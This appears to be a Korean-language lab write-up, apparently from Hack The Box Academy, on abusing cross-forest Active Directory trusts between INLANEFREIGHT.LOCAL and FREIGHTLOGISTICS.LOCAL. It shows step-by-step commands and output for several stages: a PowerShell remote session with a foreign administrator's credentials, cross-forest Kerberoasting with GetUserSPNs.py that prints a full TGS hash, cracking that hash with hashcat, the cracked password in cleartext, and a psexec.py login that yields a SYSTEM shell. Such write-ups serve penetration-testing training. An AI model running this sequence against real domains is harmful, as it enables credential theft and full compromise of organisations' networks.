출력에서 `GroupName : Administrators` 는 `FREIGHTLOGISTICS.LOCAL` 의 `Builtin Administrators` 그룹을 의미한다.

`MemberName` 에는 다른 포리스트의 SID가 `ForeignSecurityPrincipal` 객체 형태로 등록되어 있다.

해당 SID를 이름으로 변환해보면 다음과 같다:


```powershell
PS C:\Windows\system32> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500

INLANEFREIGHT\administrator
```

즉 `INLANEFREIGHT\administrator` 계정이 `FREIGHTLOGISTICS.LOCAL` 의 `Administrators` 그룹에 명시적으로 포함되어 있다.

이는 Cross-Forest Trust와 Foreign Group Membership을 통해 외부 포리스트 계정에 대상 포리스트의 관리 권한이 부여된 경우이다.

따라서 `INLANEFREIGHT\administrator` 자격 증명을 확보한 상태이고 WinRM 접근이 허용되어 있다면 다음과 같이 대상 포리스트 호스트에 원격 세션을 시도할 수 있다:

```powershell
PS C:\Windows\system32> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
inlanefreight\administrator

[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-DC03
   Primary Dns Suffix  . . . . . . . : FREIGHTLOGISTICS.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : FREIGHTLOGISTICS.LOCAL
```

## Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

### Cross-Forest Kerberoasting with Impacket

Linux에서도 Forest Trust를 통해 상대 포리스트의 SPN을 열거하고 Kerberoasting을 수행할 수 있다.

먼저 `GetUserSPNs.py` 의 `-target-domain` 옵션을 사용해 `FREIGHTLOGISTICS.LOCAL` 에서 Kerberoasting 가능한 계정을 확인하였다:

```bash
$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/htb-student

ServicePrincipalName                 Name      MemberOf                                                PasswordLastSet             LastLogon  Delegation 
-----------------------------------  --------  ------------------------------------------------------  --------------------------  ---------  ----------
MSSQLsvc/sql01.freightlogstics:1433  mssqlsvc  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-03-24 15:47:52.488917  <never>               
HTTP/sapsso.FREIGHTLOGISTICS.LOCAL   sapsso    CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never
```

이처럼 `sapsso` 계정에 SPN이 설정되어 있으며, 출력상 대상 포리스트의 `Domain Admins` 그룹에도 포함되어 있다.

따라서 `-request-user` 옵션으로 `sapsso` 의 SPN에 대한 TGS를 요청하여 오프라인 크랙용 데이터를 추출하였다:

```bash
$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL -request-user sapsso INLANEFREIGHT.LOCAL/htb-student

ServicePrincipalName                Name    MemberOf                                                PasswordLastSet             LastLogon  Delegation 
----------------------------------  ------  ------------------------------------------------------  --------------------------  ---------  ----------
HTTP/sapsso.FREIGHTLOGISTICS.LOCAL  sapsso  CN=Domain Admins,CN=Users,DC=FREIGHTLOGISTICS,DC=LOCAL  2022-04-07 17:34:17.571500  <never>               



$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$d79cb48831b2e1a79f6761fd4964a350$cfdc79d4fc93d57172e34477f2b5a57df11b86c167008892eed19d1df2421c27ddb006fc3adf24b5b125c7f2631f188f25e6574e8b3b1d659c78f665445326a2422735de810d3fe80e77ddb522cd40d4b81c588cc87905d107cabe6228ba95b342aba62de3223c0d5e166064c295330cc59449ff1755cf498f6de800c13c10975c6700e4337b6a72ce3ba8b6ace8c48f9de5bdf214c37df865c76eba70c255c690e1283a61761ba1e779688bde7523c839c1046cf9d1598f4b6528c20c9923b8625fd797dac2b7ff1f0814e960815c2612a163c4734b48fc38dc12e8a7b9c03149cffe5760d62cdc55246d05926366bf01ca4ed57c7b8d76939d1209e4dd6bafd1acee4a36e5e7447ee524edd8eaa84b9004b4a16cd0b69c092ddf1c0b257dd48ea151e6941c65c04cc7bf38634910cb52c46ff989b7c7a621fdb8500a7a1319a86247b914f92419554adebf5fcfa6f5a6f034e647fdd555439444651773d58512205a8b0203cf1408f2f20d0d9bfbda036d4d9782a7de850557f6c7c9899d2cc943618a73a8650da212d9ef3a3c24e3aed0b2e85d493705861fcafd5b918294017369489f02ed950a3941d862df05fe7885b02c6194b356d949929a93b35100e5ad4666d1791038ff14b85eca9d027019bedadc6e9459ae4ea281487fc378920948215c232290580286d9d524dbdef7a63b489b7729a957aae2779a9d0f6e7aa8febcf84d2d0318c9f33b1f36014c6389b1e1e85ececbd2138ea07988295564055071cf80a9400ba52ea999290e4650c528dd3b9985d4a53e9af6f5c2d493c9b2114529f9dc39b4d6de5841e1c96370f6005128b18f64c4828afd23a20bfe18061e965baa71e00953c8904e86b3212141d5f21db890d657da50137279b8b544e1f6dbc0fe51e4af1e4471a68e665ac686807efc471a53a9ec88d00ea46ba8e0499f0523bc806c5211cea50fb60daf29d5ba5a63f2b87bc5059b0d7817ca976feeeea359d82408a8719297e89d0bb480378d1012f3c5c55802c8e6287e255128ce4d37d4b17f45bae583fd500d816228d337d32befef09c19a9282cd5222520642d60037608e5a563f05c958ccb82ad2316bb17373fbffb985b19440b65eef4b9459ebb30dfb5f918b0ebc95a3e0ab56d505c8b3b8738e9b94af637749ef1ac1eb8d42c565fd3649aa273ce05b9eb665789f4ec545a8a4552e21378a6cce41db4f67778b393e2f51f15fedf3caa374d90be9a8dcca60a3ce1c86dcf21817bc553292042e377e8b0ae36b4bb152533b6eca853f95d9c82c3a95a6e17ea7919f4e494d1c9c934162325791c4ba42b31ff2d514e6525ee51298932c935288ab5c550257e125e23ba4be64c5a7b0f20f7028dc66f2975de5fc617d098cd5c0e1e93ffe298d6b3b86c0c191c02aae52e0b355bfe9232985f70d412911eada6b95d68d6211d136e6ce16a4a8f091947773a7ae3545a89d44f6d58a715bfc83205160075149a294b9ad0705974dcfabf88eb0
```

추출한 `$krb5tgs$23$` 값을 Hashcat으로 크랙하였다:

```bash
$ hashcat -m 13100 --show '$krb5tgs$23$*sapsso$FREIGHTLOGISTICS.LOCAL$FREIGHTLOGISTICS.LOCAL/sapsso*$d79cb48831b2e1a79f6761fd4964a350$cfdc79d4fc93d57172e34477f2b5a57df11b86c167008892eed19d1df2421c27ddb006fc3adf24b5b125c7f2631f188f25e6574e8b3b1d659c78f665445326a2422735de810d3fe80e77ddb522cd40d4b81c588cc87905d107cabe6228ba95b342aba62de3223c0d5e166064c295330cc59449ff1755cf498f6de800c13c10975c6700e4337b6a72ce3ba8b6ace8c48f9de5bdf214c37df865c76eba70c255c690e1283a61761ba1e779688bde7523c839c1046cf9d1598f4b6528c20c9923b8625fd797dac2b7ff1f0814e960815c2612a163c4734b48fc38dc12e8a7b9c03149cffe5760d62cdc55246d05926366bf01ca4ed57c7b8d76939d1209e4dd6bafd1acee4a36e5e7447ee524edd8eaa84b9004b4a16cd0b69c092ddf1c0b257dd48ea151e6941c65c04cc7bf38634910cb52c46ff989b7c7a621fdb8500a7a1319a86247b914f92419554adebf5fcfa6f5a6f034e647fdd555439444651773d58512205a8b0203cf1408f2f20d0d9bfbda036d4d9782a7de850557f6c7c9899d2cc943618a73a8650da212d9ef3a3c24e3aed0b2e85d493705861fcafd5b918294017369489f02ed950a3941d862df05fe7885b02c6194b356d949929a93b35100e5ad4666d1791038ff14b85eca9d027019bedadc6e9459ae4ea281487fc378920948215c232290580286d9d524dbdef7a63b489b7729a957aae2779a9d0f6e7aa8febcf84d2d0318c9f33b1f36014c6389b1e1e85ececbd2138ea07988295564055071cf80a9400ba52ea999290e4650c528dd3b9985d4a53e9af6f5c2d493c9b2114529f9dc39b4d6de5841e1c96370f6005128b18f64c4828afd23a20bfe18061e965baa71e00953c8904e86b3212141d5f21db890d657da50137279b8b544e1f6dbc0fe51e4af1e4471a68e665ac686807efc471a53a9ec88d00ea46ba8e0499f0523bc806c5211cea50fb60daf29d5ba5a63f2b87bc5059b0d7817ca976feeeea359d82408a8719297e89d0bb480378d1012f3c5c55802c8e6287e255128ce4d37d4b17f45bae583fd500d816228d337d32befef09c19a9282cd5222520642d60037608e5a563f05c958ccb82ad2316bb17373fbffb985b19440b65eef4b9459ebb30dfb5f918b0ebc95a3e0ab56d505c8b3b8738e9b94af637749ef1ac1eb8d42c565fd3649aa273ce05b9eb665789f4ec545a8a4552e21378a6cce41db4f67778b393e2f51f15fedf3caa374d90be9a8dcca60a3ce1c86dcf21817bc553292042e377e8b0ae36b4bb152533b6eca853f95d9c82c3a95a6e17ea7919f4e494d1c9c934162325791c4ba42b31ff2d514e6525ee51298932c935288ab5c550257e125e23ba4be64c5a7b0f20f7028dc66f2975de5fc617d098cd5c0e1e93ffe298d6b3b86c0c191c02aae52e0b355bfe9232985' /usr/share/wordlists/rockyou.txt
```

그 결과 `sapsso` 계정의 비밀번호를 확인하였다:

```text
pabloPICASSO
```

확보한 `sapsso` 자격 증명으로 대상 호스트에 `psexec.py` 를 사용해 접속을 시도하였다:

```bash
$ psexec.py FREIGHTLOGISTICS.LOCAL/sapsso:pabloPICASSO@172.16.5.238

[*] Requesting shares on 172.16.5.238.....
[*] Found writable share ADMIN$
[*] Uploading file gCUkKZjm.exe
[*] Opening SVCManager on 172.16.5.238.....
[*] Creating service KdLB on 172.16.5.238.....
[*] Starting service KdLB.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

원격 서비스 생성 권한이 확인되었으며, 최종적으로 대상 호스트에서 `NT AUTHORITY\SYSTEM` 권한의 셸을 획득하였다.